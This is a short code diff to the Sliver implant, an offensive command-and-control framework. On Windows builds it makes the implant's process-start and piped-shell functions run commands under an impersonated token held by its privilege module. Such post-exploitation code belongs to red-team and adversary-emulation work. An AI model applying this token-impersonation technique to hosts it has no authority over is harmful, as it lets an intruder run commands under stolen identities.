@@ -33,6 +33,12 @@ import (
 
 	"github.com/bishopfox/sliver/sliver/shell/pty"
 	// {{end}}
+
+	// {{if eq .GOOS "windows"}}
+	"github.com/bishopfox/sliver/sliver/priv"
+	"golang.org/x/sys/windows"
+	"syscall"
+	// {{end}}
 )
 
 const (
@@ -50,6 +56,11 @@ type Shell struct {
 // Start - Start a process
 func Start(command string) error {
 	cmd := exec.Command(command)
+	//{{if eq .GOOS "windows"}}
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(priv.CurrentToken),
+	}
+	//{{end}}
 	return cmd.Start()
 }
 
@@ -72,6 +83,11 @@ func pipedShell(tunnelID uint64, command []string) *Shell {
 
 	var cmd *exec.Cmd
 	cmd = exec.Command(command[0], command[1:]...)
+	//{{if eq .GOOS "windows"}}
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(priv.CurrentToken),
+	}
+	//{{end}}
 
 	stdin, _ := cmd.StdinPipe()
 	stdout, _ := cmd.StdoutPipe()
